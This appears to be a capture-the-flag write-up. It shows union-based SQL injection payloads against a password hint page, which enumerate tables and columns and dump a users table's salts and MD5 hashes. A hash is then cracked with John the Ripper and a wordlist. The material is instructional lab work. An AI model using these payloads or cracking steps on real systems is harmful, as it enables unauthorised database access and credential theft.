Password hint page seems to have a SQL injection.

I'm following PayloadsAllTheThings guide on SQLi.
For some reason inserting another query with semicolon isn't working so I'll be using union-based.

```
# Find number of columns in query.
1' ORDER BY 1--+	#True
1' ORDER BY 2--+	#False. Query uses only 1 column

# Get table names. There is a "users" table.
1' UniOn Select gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables where table_schema="db" -- 

# Get column names from users table. |userID|,|username|,|pass_salt|,|pass_md5|,|hint|
1' UniOn Select gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name="users" --

# Get data. It shows only this user because it's the only one where hint != NULL
# Because of this, I assume it is the interesting user.
# |c.hackle---yhbG---f2b31b3a7a7c41093321d0c98c37f5ad---I don't need any hints man!|
1' UniOn Select gRoUp_cOncaT(0x7c,username,"---",pass_salt,"---",pass_md5,"---",hint,0x7C)+fRoM+users; -- 

# Let's get cracking. I assume the salt is used this way: pass+salt
# Password: pizza. Logging in gives us the flag.
john --list=subformats
echo c.hackle:f2b31b3a7a7c41093321d0c98c37f5ad$yhbG > hashes.txt
john --format=dynamic_1 --wordlist=/usr/share/dict/rockyou.txt hashes.txt
```


